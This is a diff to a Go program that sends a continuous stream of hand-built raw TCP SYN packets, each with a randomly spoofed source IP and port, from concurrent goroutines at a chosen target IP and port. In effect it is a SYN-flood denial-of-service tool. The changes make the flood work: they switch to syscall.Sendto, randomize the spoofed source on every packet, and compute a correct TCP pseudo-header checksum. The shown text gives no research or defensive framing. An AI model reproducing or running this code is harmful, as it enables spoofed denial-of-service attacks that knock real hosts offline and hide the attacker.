@@ -7,7 +7,6 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
-	"os"
 	"syscall"
 	"time"
 )
@@ -52,26 +51,34 @@ func handle(ip net.IP, port int) {
 		return
 	}
 
-	//底层的fd转成文件对象
-	file := os.NewFile(uintptr(fd), "socket")
-
-	//文件对象转成go socket对象
-	rawSocket, err := net.FileConn(file)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-
 	for i := 0; i < 2; i++ {
 		go func() {
-			var b bytes.Buffer
 			for {
-				ipv4Byte, _ := getIPV4Header(ip)
-				tcpByte, _ := getTcpHeader(port)
+			
+				rand.Seed(time.Now().UnixNano())
+				srcIP := net.IP(make([]byte, 4))
+				binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<32-1)))
+				
+				ipv4Byte, _ := getIPV4Header(srcIP,ip)
+				tcpByte, _ := getTcpHeader(srcIP,ip,port)
 
-				b.Write(ipv4Byte)
-				b.Write(tcpByte)
-				fmt.Println(rawSocket.Write(b.Bytes()))
+				//var b bytes.Buffer
+				//b.Write(ipv4Byte)
+				//b.Write(tcpByte)
+				buffs := make([]byte,0)
+				buffs = append(buffs,ipv4Byte... )
+				buffs = append(buffs,tcpByte... )
+				
+				addr := syscall.SockaddrInet4{
+					Port: port,
+//					Addr: ip,
+				}
+				copy(addr.Addr[:4],ip)
+				fmt.Printf("Sendto %v %v ",ip,port )
+				error := syscall.Sendto(fd, buffs, 0, &addr )
+				if error != nil{
+					fmt.Println("Sendto error ",error )
+				}
 			}
 		}()
 	}
@@ -80,42 +87,87 @@ func handle(ip net.IP, port int) {
 	<-c
 }
 
-func getIPV4Header(dstIP net.IP) ([]byte, error) {
-	rand.Seed(time.Now().UnixNano())
-	srcIP := net.IP(make([]byte, 4))
-	binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<32-1)))
+func getIPV4Header(srcIp ,dstIp net.IP) ([]byte, error) {
 
 	h := &ipv4Header{
 		ID:       1,
 		TTL:      255,
 		Protocol: syscall.IPPROTO_TCP,
-		Checksum: 0,
-		Src:      srcIP,
-		Dst:      dstIP,
+		Checksum: 0, // 系统自动填充
+		Src:      srcIp,
+		Dst:      dstIp,
 	}
-
-	b, _ := h.Marshal()
-	h.Checksum = int(crc16(b))
-
 	return h.Marshal()
 }
 
-func getTcpHeader(dstPort int) ([]byte, error) {
+func CheckSum(data []byte) uint16 {
+	var (
+		sum    uint32
+		length int = len(data)
+		index  int
+	)
+	for length > 1 {
+		sum += uint32(data[index])<<8 + uint32(data[index+1])
+		index += 2
+		length -= 2
+	}
+	if length > 0 {
+		sum += uint32(data[index])
+	}
+	sum += (sum >> 16)
+
+	return uint16(^sum)
+}
+
+
+type PsdHeader struct {
+    SrcAddr   [4]uint8
+    DstAddr   [4]uint8
+    Zero      uint8
+    ProtoType uint8
+    TcpLength uint16
+}
+
+func getTcpHeader( srcIp,dstIp net.IP, dstPort int) ([]byte, error) {
 	rand.Seed(time.Now().UnixNano())
 
 	h := &tcpHeader{
-		Src:  rand.Intn(1<<16-1)%16383 + 49152,
+		Src:  9765,
 		Dst:  dstPort,
-		Seq:  rand.Intn(1<<32 - 1),
+		Seq:  690,
 		Ack:  0,
 		Flag: 0x02,
-		Win:  2048,
+		Win:  65535,
 		Urp:  0,
 	}
+	h.Src = rand.Intn(1<<16-1)%16383 + 49152
+	h.Seq = rand.Intn(1<<32 - 1)
+	h.Win = 2048
 
 	b, _ := h.Marshal()
-
-	h.Sum = int(crc16(b))
-
+	fmt.Printf(" Marshal %v %v\n",h,b )
+	
+	
+    var (
+        psdheader PsdHeader
+    )
+	/*填充TCP伪首部*/
+   copy( psdheader.SrcAddr[:4],srcIp )
+   copy( psdheader.DstAddr[:4],dstIp )
+//    psdheader.SrcAddr = [4]uint8{ srcIp[0],srcIp[1],srcIp[2],srcIp[3] }
+    psdheader.Zero = 0
+    psdheader.ProtoType = syscall.IPPROTO_TCP
+//    psdheader.TcpLength = uint16(unsafe.Sizeof(TCPHeader{})) + uint16(0)
+    psdheader.TcpLength = uint16(20)
+	
+	/*buffer用来写入两种首部来求得校验和*/
+    var (
+        buffer bytes.Buffer
+    )
+    binary.Write(&buffer, binary.BigEndian, psdheader)
+	buffs,_ := h.Marshal()
+    buffer.Write(buffs)
+	fmt.Printf(" check%v \n",buffer.Bytes() )
+	h.Sum = int(CheckSum(buffer.Bytes()))
 	return h.Marshal()
 }
